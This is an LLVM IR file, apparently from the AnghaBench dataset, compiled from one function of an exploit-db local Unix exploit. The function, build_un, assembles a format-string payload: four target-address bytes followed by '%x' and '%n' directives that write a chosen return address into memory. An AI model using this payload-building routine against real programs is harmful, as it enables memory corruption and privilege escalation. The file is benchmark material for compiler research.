; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/unix/local/extr_22924.c_build_un.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/unix/local/extr_22924.c_build_un.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@ADD = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [12 x i8] c"[ locaddr ]\00", align 1
@FOUR = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [33 x i8] c"%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c%c\00", align 1
@.str.2 = private unnamed_addr constant [12 x i8] c"[ retaddr ]\00", align 1
@MAX_FMT_LENGTH = common dso_local global i32 0, align 4
@.str.3 = private unnamed_addr constant [45 x i8] c"%%%dx%%%d$n%%%dx%%%d$n%%%dx%%%d$n%%%dx%%%d$n\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @build_un(i8* %0, i32 %1, i32 %2, i32 %3, i32 %4) #0 {
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8, align 1
  %12 = alloca i8, align 1
  %13 = alloca i8, align 1
  %14 = alloca i8, align 1
  %15 = alloca i32, align 4
  %16 = alloca i32, align 4
  store i8* %0, i8** %6, align 8
  store i32 %1, i32* %7, align 4
  store i32 %2, i32* %8, align 4
  store i32 %3, i32* %9, align 4
  store i32 %4, i32* %10, align 4
  %17 = load i32, i32* %10, align 4
  %18 = load i32, i32* @ADD, align 4
  %19 = udiv i32 %17, %18
  %20 = add i32 %19, 1
  %21 = load i32, i32* @ADD, align 4
  %22 = mul i32 %20, %21
  store i32 %22, i32* %15, align 4
  %23 = load i8, i8* %11, align 1
  %24 = load i8, i8* %12, align 1
  %25 = load i8, i8* %13, align 1
  %26 = load i8, i8* %14, align 1
  %27 = load i32, i32* %7, align 4
  %28 = call i32 @OCT(i8 zeroext %23, i8 zeroext %24, i8 zeroext %25, i8 zeroext %26, i32 %27, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str, i64 0, i64 0))
  %29 = load i8*, i8** %6, align 8
  %30 = load i32, i32* @FOUR, align 4
  %31 = add nsw i32 %30, 1
  %32 = load i8, i8* %14, align 1
  %33 = load i8, i8* %13, align 1
  %34 = zext i8 %33 to i32
  %35 = load i8, i8* %12, align 1
  %36 = load i8, i8* %11, align 1
  %37 = zext i8 %36 to i32
  %38 = load i8, i8* %14, align 1
  %39 = zext i8 %38 to i32
  %40 = add nsw i32 %39, 1
  %41 = trunc i32 %40 to i8
  %42 = load i8, i8* %13, align 1
  %43 = zext i8 %42 to i32
  %44 = load i8, i8* %12, align 1
  %45 = load i8, i8* %11, align 1
  %46 = zext i8 %45 to i32
  %47 = load i8, i8* %14, align 1
  %48 = zext i8 %47 to i32
  %49 = add nsw i32 %48, 2
  %50 = load i8, i8* %13, align 1
  %51 = zext i8 %50 to i32
  %52 = load i8, i8* %12, align 1
  %53 = zext i8 %52 to i32
  %54 = load i8, i8* %11, align 1
  %55 = zext i8 %54 to i32
  %56 = load i8, i8* %14, align 1
  %57 = zext i8 %56 to i32
  %58 = add nsw i32 %57, 3
  %59 = load i8, i8* %13, align 1
  %60 = zext i8 %59 to i32
  %61 = load i8, i8* %12, align 1
  %62 = zext i8 %61 to i32
  %63 = load i8, i8* %11, align 1
  %64 = zext i8 %63 to i32
  %65 = call i32 (i8*, i32, i8*, i8, i32, i8, i32, i8, i32, i8, i32, ...) @snprintf(i8* %29, i32 %31, i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.1, i64 0, i64 0), i8 zeroext %32, i32 %34, i8 zeroext %35, i32 %37, i8 zeroext %41, i32 %43, i8 zeroext %44, i32 %46, i32 %49, i32 %51, i32 %53, i32 %55, i32 %58, i32 %60, i32 %62, i32 %64)
  store i32 %65, i32* %16, align 4
  %66 = load i8, i8* %11, align 1
  %67 = load i8, i8* %12, align 1
  %68 = load i8, i8* %13, align 1
  %69 = load i8, i8* %14, align 1
  %70 = load i32, i32* %8, align 4
  %71 = call i32 @OCT(i8 zeroext %66, i8 zeroext %67, i8 zeroext %68, i8 zeroext %69, i32 %70, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.2, i64 0, i64 0))
  %72 = load i8*, i8** %6, align 8
  %73 = load i32, i32* %16, align 4
  %74 = sext i32 %73 to i64
  %75 = getelementptr inbounds i8, i8* %72, i64 %74
  %76 = load i32, i32* @MAX_FMT_LENGTH, align 4
  %77 = load i8, i8* %14, align 1
  %78 = zext i8 %77 to i32
  %79 = load i32, i32* @FOUR, align 4
  %80 = sub nsw i32 %78, %79
  %81 = load i32, i32* %15, align 4
  %82 = add nsw i32 %80, %81
  %83 = load i32, i32* %10, align 4
  %84 = sub i32 %82, %83
  %85 = trunc i32 %84 to i8
  %86 = load i32, i32* %9, align 4
  %87 = load i8, i8* %13, align 1
  %88 = zext i8 %87 to i32
  %89 = load i8, i8* %14, align 1
  %90 = zext i8 %89 to i32
  %91 = sub nsw i32 %88, %90
  %92 = load i32, i32* %15, align 4
  %93 = add nsw i32 %91, %92
  %94 = trunc i32 %93 to i8
  %95 = load i32, i32* %9, align 4
  %96 = add i32 %95, 1
  %97 = load i8, i8* %12, align 1
  %98 = zext i8 %97 to i32
  %99 = load i8, i8* %13, align 1
  %100 = zext i8 %99 to i32
  %101 = sub nsw i32 %98, %100
  %102 = load i32, i32* %15, align 4
  %103 = add nsw i32 %101, %102
  %104 = trunc i32 %103 to i8
  %105 = load i32, i32* %9, align 4
  %106 = add i32 %105, 2
  %107 = load i8, i8* %11, align 1
  %108 = zext i8 %107 to i32
  %109 = load i8, i8* %12, align 1
  %110 = zext i8 %109 to i32
  %111 = sub nsw i32 %108, %110
  %112 = load i32, i32* %15, align 4
  %113 = add nsw i32 %111, %112
  %114 = trunc i32 %113 to i8
  %115 = load i32, i32* %9, align 4
  %116 = add i32 %115, 3
  %117 = call i32 (i8*, i32, i8*, i8, i32, i8, i32, i8, i32, i8, i32, ...) @snprintf(i8* %75, i32 %76, i8* getelementptr inbounds ([45 x i8], [45 x i8]* @.str.3, i64 0, i64 0), i8 zeroext %85, i32 %86, i8 zeroext %94, i32 %96, i8 zeroext %104, i32 %106, i8 zeroext %114, i32 %116)
  ret i32 %117
}

declare dso_local i32 @OCT(i8 zeroext, i8 zeroext, i8 zeroext, i8 zeroext, i32, i8*) #1

declare dso_local i32 @snprintf(i8*, i32, i8*, i8 zeroext, i32, i8 zeroext, i32, i8 zeroext, i32, i8 zeroext, i32, ...) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
